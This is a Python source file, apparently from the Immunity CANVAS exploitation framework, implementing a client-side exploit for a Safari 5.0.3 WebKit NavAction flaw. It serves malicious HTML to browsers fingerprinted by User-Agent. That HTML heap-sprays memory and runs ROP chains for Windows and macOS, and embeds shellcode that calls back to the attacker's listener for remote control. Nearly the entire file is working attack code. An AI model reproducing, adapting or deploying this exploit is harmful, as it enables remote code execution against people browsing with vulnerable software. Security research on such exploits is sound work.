#! /usr/bin/env python
# -*- coding: utf-8 -*-

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
import random
import canvasengine
from libs.ua_parser import user_agent_parser

NAME                            = "safari_navaction"
DESCRIPTION                     = "Clientside exploit for Safari NavAction vulnerability."
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Apple"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["Reference"]      = ""
DOCUMENTATION["CVE"]            = ""
DOCUMENTATION["CVE url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name="
DOCUMENTATION["BUGTRAQ url"]    = "https://bugs.webkit.org/show_bug.cgi?id=51993"
DOCUMENTATION["NOTES"]          = """
This exploit will work under Safari <= 5.0.3 with OSX10.6.6 64bit and Safari 5.0.3 on Windows (Any version).

    $ python exploits/httpserver/httpserver.py -l 192.168.1.26 -d 8081 -t 192.168.1.26 -p 8080 -Osingleexploit:safari_navaction


    ROP explanation:

    Since we do not have many things to do with the only dll available
    to use for ROP, I decided to get the base of Safari.exe to abuse its
    imported functions.
    To get Safari's base, I got a pointer to the TEB, then a pointer to
    the PEB and finally to Safari's base address.
    Once I got the base, I just called
    GetProcAddress(GetModuleHandleW("kernel32"), "VirtualProtect")
    and changed the protection of our chunk.
"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows", "MacOSX"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'
TARGETS = { 0 : ['Safari 5.0.3'] }

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        import random
        # filename is used in the actual http server
        self.filename           = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        # universal shellcode?
        self.universal          = True
        self.os                 = "win"
        self.osname             = "win7"

        return

    def is_vulnerable(self, info):
        # User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4
        parsed = user_agent_parser.Parse(info['user_agent'])

        if parsed['user_agent']['family'] != 'Safari':
            return 0

        try:
            patch = int(parsed['user_agent']['minor'])
        except Exception:
            return 0

        if parsed['user_agent']['major'] != '5' or \
           parsed['user_agent']['minor'] != '0' or \
           patch > 3:
            return 0

        os_family = parsed['os']['family']

        if 'Windows' in os_family:
            self.os = "win"

            if "Windows XP" in os_family:
                self.osname = "xp"
                self.log("Detected Windows XP")

            elif "Windows 7" in os_family:
                self.osname = "win7"
                self.log("Detected Windows 7")
            else:
                self.log("Unknown Windows Version, trying with Windows 7")
                self.osname = "win7"

            return 100

        if 'Mac OS X' in os_family:
            self.log("Detected OSX")
            self.os = "mac"
            return 100

        return 0

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def createShellcode(self):
        if self.os is "win":
            return httpclientside.createShellcode(self)
        else:
            from shellcode.standalone.osx.payloads64 import payloads
            p = payloads()
            # We are setting the shellcode with fork_exit as we dont want safari to hang
            asm = p.callback(self.callback.ip, self.callback.port, universal=self.universal,fork_exit=True);
            self.shellcode = p.assemble(asm)
            return self.shellcode

    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return

    def run(self):
        self.log("Run this from clientd")
        return 0

    def makefile(self):
        if self.os is "win":
            return self.makefile_win()
        else:
            return self.makefile_osx()

    def makefile_win(self):
        shellcode = self.createShellcode()

        if self.osname is "win7":
            rop_base = 0x10000000
        else:
            rop_base = 0x01370000

        self.log("Setting ROP Base Address to %x" % rop_base)

        html = \
        """
        <html>
            <body onload="runTest()">
                <div id="console"></div>
                <form id="form1" style="display:none" method="post" target="test" action="http://anything.com"></form>
                <script>
                    var rop_base = ROP_BASE;

                    function hexa(val)
                    {
                        var str = new Number(val).toString(16);
                        while (str.length < 4)
                            str = "0" + str;

                        return str;
                    }

                    function myescape(addr)
                    {
                        var str = "";
                        str = "%u" + hexa(addr & 0xffff) + "%u" + hexa((addr >> 16) & 0xffff);
                        return unescape(str);
                    }

                    function runTest()
                    {
                        document.getElementById('form1').submit();
                        document.getElementById('console').innerHTML = 'PASS';
                    }

                    function rep(string, times)
                    {
                        var tmp = "";
                        for(i = 0; i < times; i++)
                            tmp += string;

                        return tmp;
                    }

                    function spray(size, n, value)
                    {
                        var string_size = size / 2;

                        var obj_address     = 0x7e0f0000;
                        var writable        = obj_address + 0x0;
                        var kernel32        = obj_address + 0x4;
                        var VirtualProtect  = obj_address + 0x18;
                        var shellcode       = obj_address + 0x164;
                        var hmodule         = obj_address + 0x12c - 0x1c;

                        var str = myescape(obj_address + 0x20);
                        str += "kernel32";                             // obj_address + 0x4
                        str += myescape(0x00000000);                   // 5 null
                        str += unescape('%u6956%u7472%u6175%u506c%u6f72%u6574%u7463%u0000') // obj_address + 0x18
                        str += myescape(rop_base + 0x139f);            //
                        str += myescape(obj_address+0x30-0x58);        // obj_address + 0x28
                        str += myescape(rop_base + 0x66e6);            // 5 : eax = TEB
                        str += rep(myescape(rop_base + 0x718f), 24);   // 6 - 29
                        str += myescape(rop_base + 0x15c4);            // 30 EAX = PEB
                        str += rep(myescape(rop_base + 0x6c11), 16);   // 31 - 46 "dec     eax, ret" 16 times
                        str += myescape(rop_base + 0x15c4);            // 47 EAX = Safari.exe base address
                        str += myescape(rop_base + 0x52FB);            // 48 safari_base = eax = edi
                        str += myescape(rop_base + 0x10FE);            // 49 pop esi ; ret ; ESI = 0x201c
                        str += myescape(0x0000201C);            // 50 safari_base + 0x201c = GetModuleHandleW
                        str += myescape(rop_base + 0x1018);     // 51 add eax, esi ; ret
                        str += myescape(rop_base + 0x6F8C);     // 52 resolve symbol and call
                        str += myescape(0xfafafafa);            // 53 dummy
                        str += myescape(rop_base + 0x15F4);     // 54 Push to the stack the HMODULE of kernel32.dll
                        str += myescape(kernel32);              // 55 "kernel32" address
                        str += myescape(rop_base + 0x17E6);     // 56 add esp, 0x10 ; restore base -> eax = edi = safari_base
                        str += myescape(hmodule);               // 54 Offset to -> (1)
                        str += myescape(0x11111111);            // 62 dummy
                        str += myescape(0x22222222);            // 63 dummy
                        str += myescape(0x33333333);            // 64 dummy
                        str += myescape(rop_base + 0x10FE);     // 57 pop esi ; ret -> esi = GetProcAddress offset
                        str += myescape(0x00002034);            // 58 GetProcAddress offset
                        str += myescape(rop_base + 0x52FB);     // 48 safari_base = eax = edi
                        str += myescape(rop_base + 0x1018);     // 59 add eax, esi ; ret
                        str += myescape(rop_base + 0x6F8C);     // 60 resolve symbol and call GetProcAddress(kernel32.dll, "VirtualProtect")
                        str += myescape(0x00000007);            // 66 dummy
                        str += myescape(rop_base + 0x1186);     // 67 ret from GetProcAddress (add esp,10 ; ret)
                        str += myescape(0x00000009);            // 68 HMODULE (1)
                        str += myescape(VirtualProtect);        // 69 VirtualProtect
                        str += myescape(0x0000000b);            // 70 dummy
                        str += myescape(0x0000000c);            // 71 dummy
                        str += myescape(0x0000000d);            // 72 dummy
                        str += myescape(obj_address);           // 73 dummy
                        str += myescape(rop_base + 0x4EA4);     // 74 Call VirtualProtect
                        str += myescape(shellcode);             // 75 lpAddress
                        str += myescape(0x00001000);            // 76 dwSize
                        str += myescape(0x00000040);            // 77 flNewProtect
                        str += myescape(writable);              // 78 lpflOldProtect
                        str += myescape(0xbadc0ded);            // 78 dummy
                        str += myescape(rop_base + 0x1189);     // 79 call shellcode
                        str += myescape(shellcode);             // 80 shellcode address
        """.replace("ROP_BASE", str(hex(rop_base)))

        html += 'str += unescape("%s");                  // shellcode' %(urluencode(shellcode))

        html += \
        """

                        var i = 0;
                        while (str.length < string_size)
                        {
                            str += myescape(value) + myescape(i);
                            i++;
                        }

                        h1 = [];
                        h1[0] = str;

                        // this is te begining of the allocations

                        for (i = 1 ; i < n; i++)
                        {
                            h1[i] = unescape(h1[0].substring(0, string_size));
                        }
                    }

                    function build_object(size, n, value)
                    {
                        // rop base is always readable
                        var readable    = rop_base + 0x0000;
                        var obj_address = 0x7e0f0000;

                        var obj_size = size * 2;
                        var string_size = (obj_size+0x40)/0x2 - 0x20;

                        var str = myescape(obj_address);
                        str += myescape(0xcacacaca);

                        var i = 0;

                        while (str.length < string_size)
                        {
                            if (i == 0x3)
                            {
                                str += myescape(obj_address+0x30-4);
                            }
                            else if (i == 0x4)
                            {
                                str += myescape(rop_base + 0x139f);
                            }
                            else if (i == 0x3c)
                            {
                                str += myescape(obj_address);
                            }
                            else if(i == 0x48)
                            {
                                str += myescape(obj_address);
                            }
                            else
                            {
                                str += myescape(i);
                            }

                            i++;
                        }

                        h1 = [];
                        h1[0] = str;

                        for (i = 1 ; i < n; i++)
                        {
                            h1[i] = unescape(h1[0].substring(0, string_size));
                        }
                    }

                    count = 0;
                    document.addEventListener("beforeload", function(event)
                    {
                        event.preventDefault();
                        spray(0x1000, 0x8000, 0xcafecafe);

                        count = count + 1;
                        if (count == 2)
                        {
                            document.body.removeChild(document.getElementById('test'));
                            document.body.offsetTop;
                            build_object(0x2c0, 2, 0xdddddddd);
                        }
                    }, true);
            </script>
            <iframe id="test" src="about:blank"></iframe>
        </body>
        </html>
        """

        return html

    def makefile_osx(self):
        chunk_addr = 0x100b10008
        chunk_addr_lo = hex(chunk_addr & ((2**32)-1))
        chunk_addr_hi = hex(chunk_addr >> 32)

        shellcode = self.createShellcode()

        html = \
        """
        <html>
            <body onload="runTest()">
                <div id="console"></div>
                <form id="form1" style="display:none" method="post" target="test" action="http://anything.com"></form>
                <script>
                    function hexa(val)
                    {
                        var str = new Number(val).toString(16);
                        while (str.length < 4)
                            str = "0" + str;

                        return str;
                    }

                    function myescape(addr)
                    {
                        var str = "";
                        str = "%u" + hexa(addr & 0xffff) + "%u" + hexa((addr >> 16) & 0xffff);
                        return unescape(str);
                    }

                    function runTest()
                    {
                        document.getElementById('form1').submit();
                        document.getElementById('console').innerHTML = 'PASS';
                    }

                    function pad(size)
                    {
                        var i = 0;
                        var pad = unescape("%ucccc");
                        var str = "";
                        while(i < size)
                        {
                            str += padding;
                            i += 2;
                        }

                        return str;
                    }
        """

        html += \
        """

                    // 0x120ad7000:
                    var hi_addr = 0x00000001;
                    var lo_addr = 0x20ad8000;

                    function spray(size, n, value)
                    {
                        // Take into account that wide chars are 2 bytes.
                        var string_size = size / 2;
                        var i = 0;

                        // Make the chunk refer itself
                        var str = myescape(lo_addr) + myescape(hi_addr);

                        while (str.length < string_size)
                        {
                            if(i == 0x2)
                            {
                                // Stack switch.
                                str += myescape(0x5FC24CD8) + myescape(0x00007FFF);
                            }
                            else if(i == 0x6)
                            {
                                // The stack switch will get this QWORD that points to the new stack (S1)
                                str += myescape(lo_addr+0x33*8) + myescape(hi_addr);
                            }
                            else if (i == 0x32)
                            {
                                // S1: The new stack
                                var shellcodeaddr = 0x60000010000;
                                str += myescape(lo_addr+0x34*8) + myescape(hi_addr); // rdi (2)
                                str += myescape(0x5FC24CA1) + myescape(0x00007FFF);  // +00 rop (3)
                                str += myescape(0xcafecafe) + myescape(0xcafecafe);  // +08 dummy
                                str += myescape(0x00001012) + myescape(0x00000000);  // +10 MAP_FIXED|MAP_ANON|MAP_PRIVATE = flags = rcx
                                str += myescape(0x00000006) + myescape(0x00000000);  // +18 PROT_EXEC|PROT_WRITE = prot = rdx
                                str += myescape(0xcafecafe) + myescape(0xcafecafe);  // +20 dummy
                                str += myescape(0x00002000) + myescape(0x00000000);  // +28 size = rsi
                                str += myescape(0xcafecafe) + myescape(0xcafecafe);  // +30 dummy = rbp
                                str += myescape(lo_addr+0x3e*8) + myescape(hi_addr); // +38 rsp
                                str += myescape(0x00000000) + myescape(0x00000000);  // +40 zero = r8
                                str += myescape(0x00000000) + myescape(0x00000000);  // +48 zero = r9 and later rdi
                                str += myescape(0x00010000) + myescape(0x00000600);  // +50
                                str += myescape(0x5FC1FAEA) + myescape(0x00007FFF);  // mmap
                                str += myescape(0x5FC24CDC) + myescape(0x00007FFF);  // pop rdi; ret
                                str += myescape(lo_addr+0x43*8) + myescape(hi_addr); // rdi(1)
                                str += myescape(0x5FC24CA1) + myescape(0x00007FFF);  // from *(rdi+offset) to regs
                                str += myescape(0xcafecafe) + myescape(0xcafecafe); // +0
                                str += myescape(0xcafecafe) + myescape(0xcafecafe); // +8
                                str += myescape(0xcafecafe) + myescape(0xcafecafe); // +18 = rcx
                                str += myescape(0x00001000) + myescape(0x00000000); // +10 = rdx = size
                                str += myescape(0xcafecafe) + myescape(0xcafecafe); // +20
                                str += myescape(lo_addr+0x4e*8) + myescape(hi_addr); // +28 = rsi = src  -> relative to the sellcode
                                str += myescape(0xcafecafe) + myescape(0xcafecafe); // +30
                                str += myescape(lo_addr+0x4b*8) + myescape(hi_addr); // +38 = rsp = new_stack
                                str += myescape(0x00010000) + myescape(0x00000600); // rdi = dst -> shellcode address
                                str += myescape(0x5FC234F0) + myescape(0x00007FFF); // <__dyld_memcpy>
                                str += myescape(0x00010000) + myescape(0x00000600); // ret2shellcode
                                str += unescape("%s");
                                var shellcode_qwords = %s / 8;

                                i += (shellcode_qwords + 27) - 1
                            }
                            else
                            {
                                str += myescape(0xbbbbbbbb) + myescape(i);
                            }

                            i++;
                        }

                        h1 = [];
                        h1[0] = str;

                        for (i = 1 ; i < n; i++)
                        {
                            h1[i] = unescape(h1[0].substring(0, string_size));
                        }
                    }

                    function build_object(size, n, value)
                    {
                        var string_size = size / 2;
                        var i = 0;
                        var str = myescape(value) + myescape(value);

                        while (str.length < string_size)
                        {
                            if (i == 0x2e)
                            {
                                str += myescape(0x836d9094) + myescape(0x00007fff);
                            }
                            else if(i == 0x39)
                            {
                                str += myescape(lo_addr) + myescape(hi_addr);
                            }
                            else
                            {
                                str += myescape(i) + myescape(0xcafecafe);
                            }

                            i++;
                        }

                        h1 = [];
                        h1[0] = str;

                        for (i = 1 ; i != n; ++i)
                        {
                            h1[i] = unescape(h1[0].substring(0, string_size));
                        }
                    }

                    count = 0;
                    document.addEventListener("beforeload", function(event)
                    {
                        event.preventDefault();

                        // Spray create 0x4000 pages with our spray.
                        spray(0x2000, 0x4000, 0xcafecafe);

                        count = count + 1;
                        if (count == 2)
                        {
                            document.body.removeChild(document.getElementById('test'));
                            document.body.offsetTop;
                            build_object(0x6c0, 2, 0xcafecafe);
                        }
                    }, true);
                </script>
                <iframe id="test" src="about:blank"></iframe>
            </body>
        </html>
        """ %(urluencode(shellcode), len(shellcode))

        self.log("Size of shellcode in bytes %d" % len(shellcode))

        return html


    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body

        h=header('SERVER')
        b=body()
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")

            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None

        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
            #h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    print "This needs to be run from clientd"
